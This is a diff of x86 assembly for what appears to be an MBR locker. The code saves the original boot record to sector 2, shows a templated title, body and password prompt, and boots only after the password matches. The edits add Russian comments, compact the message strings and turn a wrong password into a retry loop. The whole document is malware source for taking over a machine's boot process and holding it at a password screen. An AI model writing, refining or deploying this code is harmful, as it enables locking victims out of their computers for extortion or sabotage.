@@ -11,11 +11,14 @@ start:
     mov sp, 0x7C00
     sti
 
+    ; Сохраняем оригинальный MBR в сектор 2
     call save_mbr
 
+    ; Очищаем экран
     mov ax, 0x0003
     int 0x10
 
+    ; Устанавливаем фон
     mov ah, 0x06
     mov al, 0
     mov bh, 0x00
@@ -23,26 +26,31 @@ start:
     mov dx, 0x184F
     int 0x10
 
+    ; Устанавливаем цвет текста
     mov ax, 0x0A00
     int 0x10
 
+    ; Выводим заголовок
     mov si, msg_title
     call print
 
+    ; Выводим тело
     mov si, msg_body
     call print
 
+    ; Выводим приглашение
     mov si, msg_prompt
     call print
 
+password_loop:
     call get_password
     call check_password
     cmp byte [password_ok], 1
     je restore_and_boot
-
+    
     mov si, msg_wrong
     call print
-    jmp hang
+    jmp password_loop
 
 restore_and_boot:
     call restore_mbr
@@ -61,7 +69,6 @@ save_mbr:
     mov dl, 0x80
     int 0x13
     jc .error
-
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x7E00
@@ -89,7 +96,6 @@ restore_mbr:
     mov dl, 0x80
     int 0x13
     jc .error
-
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x7E00
@@ -179,29 +185,23 @@ hang:
     hlt
     jmp hang
 
+; ===== ДАННЫЕ (КОМПАКТНЫЕ) =====
 msg_title:
-    db 0x0D, 0x0A
-    db '========================================', 0x0D, 0x0A
-    db '     {TITLE} ', 0x0D, 0x0A
-    db '========================================', 0x0D, 0x0A
-    db 0
+    db 13,10,'==============',13,10
+    db '[ {TITLE} ]',13,10
+    db '==============',13,10,0
 
 msg_body:
-    db 0x0D, 0x0A
-    db '{BODY}', 0x0D, 0x0A
-    db 0
+    db '{BODY}',13,10,0
 
 msg_prompt:
-    db 0x0D, 0x0A
-    db 'Password: ', 0
+    db 'Password: ',0
 
 msg_wrong:
-    db 0x0D, 0x0A
-    db 'Wrong password!', 0x0D, 0x0A
-    db 0
+    db 13,10,'Wrong! ',0
 
 password:
-    db '{PASSWORD}', 0
+    db '{PASSWORD}',0
 
 buffer:
     times 32 db 0
